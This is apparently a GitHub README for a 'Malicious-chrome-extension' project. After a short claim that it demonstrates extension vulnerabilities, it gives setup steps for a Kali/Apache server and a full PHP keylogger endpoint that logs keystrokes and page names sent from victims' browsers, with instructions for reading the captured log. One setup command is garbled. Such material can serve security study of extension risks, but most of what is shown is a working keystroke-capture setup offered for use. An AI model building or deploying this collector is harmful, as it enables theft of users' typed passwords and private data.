# Malicious-chrome-extension
<!-- ABOUT THE PROJECT -->
<div id="top"></div>
### About The Project

Vulnerabilities in browser extensions put users at risk by providing a way for website and network attakcers to gain access to user's private data and credentials. Browser extensions can introduce serious security vulnerabilities into users browsers.

<p align="right">(<a href="#top">back to top</a>)</p>

## Getting started
1. Clone this git repository
2. Settings > Extensions > enable developer mode > Load unpacked > upload the folder  
3. In server(kali linux),
           - sudo systemctl enable apache2
           - sudo service apache2 start
           - cd /var/www/html
           - sudo mkdir keylogger
           - cd keylogger
           - nano index.php
             <?php
              if(!isset($_POST['key'])){ ### Authenticate input
                      echo("Access Denied!");
                      exit(0);
              }
              $file = fopen("key.log","a+");
              if(!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']){
                      $_SESSION['page'] = $_POST['page'];
                      fwrite($file,"[[[ PAGE : ".$_POST['page']."]]]");
              }
              fwrite($file,$_POST['key']);
              fclose($file);
              echo('char saved!');
            - cd ..
            - cd ..
            - -hR www-data:www-data html
            - Open a browser > 192.168.xx.xx/keylogger/key.log
            




